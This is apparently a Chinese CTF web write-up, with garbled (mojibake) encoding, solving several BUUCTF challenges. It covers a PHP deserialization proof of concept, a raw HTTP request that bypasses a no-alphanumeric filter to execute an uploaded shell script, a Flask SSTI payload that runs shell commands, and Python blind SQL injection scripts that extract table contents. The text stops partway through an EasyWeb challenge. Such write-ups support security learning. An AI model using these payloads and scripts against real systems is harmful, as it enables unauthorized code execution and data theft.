php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fd</span> = fopen(<span class="keyword">$this</span>-&gt;logFile, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fd</span>, <span class="variable">$msg</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = unserialize(<span class="variable">$log</span>);</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>çœ‹æºç å¯ä»¥çŸ¥é“æ˜¯ä¸€é“ç®€å•çš„ååºåˆ—åŒ–é¢˜ã€‚</p><p>é¦–å…ˆæ˜¯<code>__wakeup()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿›åˆ°äº†loggerç±»é‡Œï¼Œloggerç±»é‡Œæœ‰ä¸€ä¸ª<code>__construct</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">    readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªreadfileï¼Œåˆ°è¿™åº”è¯¥å°±å¯ä»¥æ‹¿åˆ°flagäº†ï¼Œå¤§æ¦‚é¡ºåºå°±æ˜¯</p><blockquote><p>weblog -&gt; __wakeup() -&gt; logger -&gt; __construct() -&gt; readfile</p></blockquote><p>pocåœ¨è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="keyword">new</span> weblog();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$log</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç©¿çš„æ—¶å€™è¦æ³¨æ„ä¸€ä¸‹ï¼Œåˆšå¼€å§‹æœ‰ä¸ªæ­£åˆ™éœ€è¦åŒå†™ç»•ã€‚</p><h2 id="æ´¥é—¨æ¯2021-hate-php"><a href="#æ´¥é—¨æ¯2021-hate-php" class="headerlink" title="[æ´¥é—¨æ¯2021]hate_php"></a>[æ´¥é—¨æ¯2021]hate_php</h2><p>è¿™é¢˜æ˜¯ä¸€é“æ— å­—æ¯æ•°å­—çš„trickï¼Œå¯ä»¥ç”¨pç¥çš„æ–¹æ³•ç»•ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">åŸç†åœ¨è¿™</a>ã€‚</p><p>è™½ç„¶@è¢«banäº†ï¼Œä½†æ˜¯è¿˜å¯ä»¥ç”¨?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?code=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.%<span class="number">20</span>/???/????????[?-[]`;<span class="meta">?&gt;</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">122.112</span><span class="number">.214</span><span class="number">.101</span>:<span class="number">20002</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">90.0</span><span class="number">.4430</span><span class="number">.93</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span><br><span class="line"><span class="comment">Content-Length: 172</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.sh&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">cat /flag</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span></span><br></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>ç®€å•çš„sstié¢˜ï¼Œä½†æ˜¯éœ€è¦å†™ä»£ç æŸ¥æ‰¾æ‰€éœ€ç±»çš„ä½ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">170</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&quot;http://9cf6a01e-8851-4fbe-a9d1-586bcb300271.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        res = re.findall(<span class="string">&quot;&lt;h2&gt;You searched for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;&quot;</span>, r.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        res = html.unescape(res[<span class="number">0</span>])</span><br><span class="line">        print(<span class="built_in">str</span>(i) + <span class="string">&quot; | &quot;</span> + res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;subprocess.Popen&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            index = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">print(<span class="string">&quot;indexo of subprocess.Popen:&quot;</span> + <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä½ç½®ä¹‹åç›´æ¥æ‹¿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h3 id="sqlæ— åˆ—å-sys-schema-table-statistics"><a href="#sqlæ— åˆ—å-sys-schema-table-statistics" class="headerlink" title="sqlæ— åˆ—å + sys.schema_table_statistics"></a>sqlæ— åˆ—å + sys.schema_table_statistics</h3><p>ç®€å•sqlç›²æ³¨ï¼Œä¸€å…±çœ‹åˆ°ä¸‰ä¸ªå›æ˜¾ã€‚</p><blockquote><p>Nu1L</p><p>SQL Injection Checked.</p><p>V&amp;N</p></blockquote><p>banäº†è®¸å¤šä¸œè¥¿ï¼Œè¿infomation_schemaä¹Ÿæ— äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨sys.schema_table_statisticsæ‹¿åˆ°è¡¨åã€‚</p><p>ç»™ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://13abe06b-22f6-4d77-ab52-8cdfd79f2e56.node4.buuoj.cn/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;2||ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(f&quot;[*]Left new is: &#123;left&#125; ~ Right new is: &#123;right&#125;&quot;)</span></span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‹¿åˆ°è¡¨åï¼Œä½†æ˜¯æ‹¿ä¸åˆ°åˆ—åï¼Œè¿™é‡Œå°±éœ€è¦æ— åˆ—åæ³¨å…¥ã€‚</p><p>è¿™é‡Œé‡æ–°è¯´ä¸€ä¸‹æ— åˆ—åæ³¨å…¥ï¼Œåœ¨sqlé‡Œæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°æ˜¯å’Œé•¿åº¦æ— å…³çš„ï¼Œå°±åƒcè¯­è¨€é‡Œçš„strcmpã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723125358768.png"></p><p>ä¸éš¾ç†è§£ï¼Œç„¶åç›´æ¥å†™è„šæœ¬è·‘flagå°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://aef16e32-90b1-4ea9-8cf6-ce25567b080d.node4.buuoj.cn/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">f&#x27;2||((select 1,&quot;<span class="subst">&#123;result + <span class="built_in">chr</span>(mid)&#125;</span>&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(f&quot;[*]Left new is: &#123;left&#125; ~ Right new is: &#123;right&#125;&quot;)</span></span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><blockquote><p>flag{e2987a47-cb43-46cf-955a-b25eea7235ee}</p></blockquote><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº†ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œè¿‡æ»¤äº†å­—æ¯æ•°å­—ï¼Œç„¶åè¿›ä¸€ä¸ªeval()ï¼Œä¸Šé¢åˆç»™å‡ºäº†ä¸€ä¸ªget_the_flag()å‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥ä¸Šä¼ 